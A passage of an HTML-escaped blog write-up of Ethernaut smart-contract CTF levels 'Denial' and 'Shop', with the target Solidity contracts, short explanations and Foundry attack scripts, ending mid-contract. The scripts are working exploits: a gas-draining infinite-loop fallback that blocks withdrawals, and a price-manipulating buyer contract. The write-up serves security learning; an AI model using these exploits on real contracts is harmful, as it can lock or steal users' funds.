&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;contractBalance&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public view returns &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;balance&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Goal&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;Deny the owner from withdrawing funds when they call withdraw() (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;ul&gt;
&lt;li&gt;Solution&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;We should revert the call when the owner calls the &lt;code&gt;withdraw()&lt;&#x2F;code&gt; function. But if we do a simple revert in our contract fallback it won&#x27;t work.&lt;&#x2F;li&gt;
&lt;li&gt;Because withdraw function doesn&#x27;t check for the return value.&lt;&#x2F;li&gt;
&lt;li&gt;One thing we can do is, drain the gas of the transaction that is sent by the owner.&lt;&#x2F;li&gt;
&lt;li&gt;Call to partner is made by the &lt;code&gt;call&lt;&#x2F;code&gt; which will forward all the remaining gas to the external call.&lt;&#x2F;li&gt;
&lt;li&gt;So, we can drain all the gas by writing a most expensive computation in Partner contract.&lt;&#x2F;li&gt;
&lt;li&gt;I have written an infinite loop inside the fallback of the Attack contract and registered the Attack contract as the partner in Denial contract.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;&lt;code&gt;DenialSolve.s.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;Script.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;console.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;{Denial} &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;..&#x2F;src&#x2F;Denial.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract DenialSolve is Script{
&lt;&#x2F;span&gt;&lt;span&gt;    Denial public denial &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Denial&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;payable&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x82091354dc7d529c2d52F4D99f7108630ECaE590&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;startBroadcast&lt;&#x2F;span&gt;&lt;span&gt;(vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;envUint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;PRIVATE_KEY&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Denial Balance : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(denial)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;balance)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;Attack&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exploit&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;stopBroadcast&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Attack{
&lt;&#x2F;span&gt;&lt;span&gt;    Denial public denial &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Denial&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;payable&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x82091354dc7d529c2d52F4D99f7108630ECaE590&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    uint public x&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exploit&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        denial&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;setWithdrawPartner&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; denial.withdraw();
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;fallback&lt;&#x2F;span&gt;&lt;span&gt;() external payable{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;(uint i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span&gt;i&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span&gt;i&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;++&lt;&#x2F;span&gt;&lt;span&gt;){
&lt;&#x2F;span&gt;&lt;span&gt;            x &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;x &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;i&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;To run script :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; source .env
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; forge script script&#x2F;DenialSolve.s.sol:DenialSolve&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --rpc-url &lt;&#x2F;span&gt;&lt;span&gt;$RPC_URL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --broadcast
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;21-shop&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#21-shop&quot; aria-label=&quot;Anchor link for: 21-shop&quot;&gt;21 Shop&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;code&gt;Shop.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;interface &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;Buyer &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;price&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external view returns &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Shop {
&lt;&#x2F;span&gt;&lt;span&gt;  uint public price &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;100&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  bool public isSold&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;buy&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    Buyer _buyer &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Buyer&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(_buyer&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;price&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;= &lt;&#x2F;span&gt;&lt;span&gt;price &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;amp;&amp;amp; !&lt;&#x2F;span&gt;&lt;span&gt;isSold) {
&lt;&#x2F;span&gt;&lt;span&gt;      isSold &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;true&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;      price &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;_buyer&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;price&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Goal&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;–°an you get the item from the shop for less than the price asked?&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;ul&gt;
&lt;li&gt;Solution&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;This is similar to the Elevator challenge. Elevator uses a an external normal function to call.&lt;&#x2F;li&gt;
&lt;li&gt;But here &lt;code&gt;price()&lt;&#x2F;code&gt; should a view function. Which shouldn&#x27;t modify the storage of the contract.&lt;&#x2F;li&gt;
&lt;li&gt;So, we cant just keep the number of the calls to the &lt;code&gt;price()&lt;&#x2F;code&gt; function in our Attack contract.&lt;&#x2F;li&gt;
&lt;li&gt;We can make use of &lt;code&gt;isSold&lt;&#x2F;code&gt; variable to check that the &lt;code&gt;price()&lt;&#x2F;code&gt; is called or not. This can be acceptable inside a view function.&lt;&#x2F;li&gt;
&lt;li&gt;So, I wrote Attack contract with &lt;code&gt;price()&lt;&#x2F;code&gt; function defined as view and it returns two different price values for the initial call and second call.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;&lt;code&gt;ShopSolve.s.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;Script.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;console.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;{Shop} &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;..&#x2F;src&#x2F;Shop.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract ShopSolve is Script{
&lt;&#x2F;span&gt;&lt;span&gt;    Shop public shop &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Shop&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x45e7A13038eCA7cCfd53aC8C4F345A7bC2fCd2A2&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;startBroadcast&lt;&#x2F;span&gt;&lt;span&gt;(vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;envUint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;PRIVATE_KEY&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;is Sold : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;shop&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;isSold&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;Attack&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exploit&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;is Sold : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;shop&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;isSold&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;        
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;stopBroadcast&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Attack{
&lt;&#x2F;span&gt;&lt;span&gt;    Shop public shop &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Shop&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x45e7A13038eCA7cCfd53aC8C4F345A7bC2fCd2A2&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exploit&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        shop&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;buy&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
